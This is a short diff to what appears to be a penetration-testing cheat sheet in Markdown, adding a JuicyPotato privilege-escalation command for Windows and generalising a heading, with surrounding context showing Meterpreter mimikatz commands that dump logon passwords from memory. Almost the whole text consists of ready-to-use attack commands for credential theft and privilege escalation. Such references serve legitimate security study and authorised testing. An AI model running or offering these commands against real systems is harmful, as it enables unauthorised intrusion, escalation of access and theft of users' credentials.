@@ -170,8 +170,12 @@ meterpreter > mimikatz_command -f sekurlsa::searchPasswords
 meterpreter > mimikatz_command -f sekurlsa::logonpasswords
 ```
 
-# Privilege Escalation of Windows 7
+# Privilege Escalation of Windows 
 
+### JuicyPotato
+```bash
+JuicyPotato.exe -l <PORT> -p c:\windows\system32\cmd.exe -t * 
+```
 ### Migrate Process
 ```bash
 msf > ps
